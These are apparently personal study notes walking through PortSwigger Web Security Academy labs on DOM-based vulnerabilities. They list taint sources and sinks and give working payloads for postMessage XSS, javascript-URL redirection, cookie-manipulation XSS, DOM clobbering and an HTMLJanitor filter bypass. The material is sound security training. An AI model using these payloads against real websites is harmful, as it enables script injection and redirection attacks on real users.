# Portswigger
## DOM-based Vulnerabilities
### Common sources
#### The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
```bash

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

```
##### Reference
https://portswigger.net/web-security/dom-based
### Common sinks
```bash

DOM-based vulnerability	              Example sink
DOM XSS LABS	                    document.write()
Open redirection LABS	            window.location
Cookie manipulation LABS	        document.cookie
JavaScript injection	            eval()
Document-domain manipulation        document.domain
WebSocket-URL poisoning	            WebSocket()
Link manipulation	                element.src
Web message manipulation	        postMessage()
Ajax request-header manipulation	setRequestHeader()
Local file-path manipulation	    FileReader.readAsText()
Client-side SQL injection	        ExecuteSql()
HTML5-storage manipulation	        sessionStorage.setItem()
Client-side XPath injection	        document.evaluate()
Client-side JSON injection	        JSON.parse()
DOM-data manipulation	            element.setAttribute()
Denial of service	                RegExp()

```
##### Reference
https://portswigger.net/web-security/dom-based

### DOM XSS using web messages
```bash

# This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

Go to:

view-source:https://ac581f321e3d6f77c093062d00bb00b5.web-security-academy.net/

Note:

<script>
window.addEventListener('message', function(e) {
document.getElementById('ads').innerHTML = e.data;
})
</script>

Go to: "Go to exploit server"

Change:

<iframe src="//https://ac581f321e3d6f77c093062d00bb00b5.web-security-academy.net/" onload="this.contentWindow.postMessage('print()','*')">

To

<iframe src="https://ac581f321e3d6f77c093062d00bb00b5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

Body:

<iframe src="https://ac581f321e3d6f77c093062d00bb00b5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528213648.png)

### DOM XSS using web messages and a JavaScript URL
```bash

# This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

Go to:

view-source:https://ac581f321e3d6f77c093062d00bb00b5.web-security-academy.net/

Note:

<script>
window.addEventListener('message', function(e) {
var url = e.data;
if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
 location.href = url;
}
}, false);
</script>

Go to: "Go to exploit server"
Body:

<iframe src="https://ace91f201fb434d5c0b82095007d005b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528215808.png)

### DOM XSS using web messages and JSON.parse
```bash

# This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

Go to:

view-source:https://ac6e1fd91e05dffcc0be62cc00e100d4.web-security-academy.net/

Go to: "Go to exploit server"
Body:

<iframe src=https://ac6e1fd91e05dffcc0be62cc00e100d4.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528232236.png)

### Which sinks can lead to DOM-based open-redirection vulnerabilities?
#### The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:
```bash

location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()

```
##### Reference
https://portswigger.net/web-security/dom-based/open-redirection

### DOM-based open redirection
```bash

# This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

Go to: 

view-source:https://aca91fec1eaebddfc063462700c2002c.web-security-academy.net/post?postId=4

Note:

<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

Enter into URL:

https://aca91fec1eaebddfc063462700c2002c.web-security-academy.net/post?postId=4&url=https://exploit-acc51fa41eecbd30c061466201920089.web-security-academy.net

.```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528233057.png)

### DOM-based cookie manipulation
```bash

# This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages. 

Go to:

view-source:https://acea1f481fc06d78c00d6d6000b00008.web-security-academy.net/product?productId=1

Note:

<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>

Go to: "Go to exploit server"
Body:

<iframe src="https://acea1f481fc06d78c00d6d6000b00008.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://acea1f481fc06d78c00d6d6000b00008.web-security-academy.net';window.x=1;">

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528235022.png)

### Exploiting DOM clobbering to enable XSS
```bash

# This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function. 

Go to: "View post"
Ctrl+shift+I -> Network -> loadCommentsWithDomClobbering.js
Right-click -> Open in new tab

Note the 'or' operator '||' @

let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}

Go to: "View post"
Comment:

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

Name:

name

Email:

email@email.com

Click "Post comment"
Click "Back to blog"
Comment:

anything

Name:

name

Email:

email@email.com

Click "Post comment"
Click "Back to blog"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529003343.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529003419.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529004041.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529004114.png)

### Clobbering DOM attributes to bypass HTML filters
```bash

# This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

Go to: "View post"
Comment:

<form id=x tabindex=0 onfocus=print()><input id=attributes>


Name:

name

Email:

email@email.com

Click "Back to blog"
Copy the end-point

https://acd41fd91ea183fdc01707f4006100ea.web-security-academy.net/post?postId=7

Go to: "Go to exploit server"
Body:

<iframe src=https://acd41fd91ea183fdc01707f4006100ea.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529010113.png)

#hacking
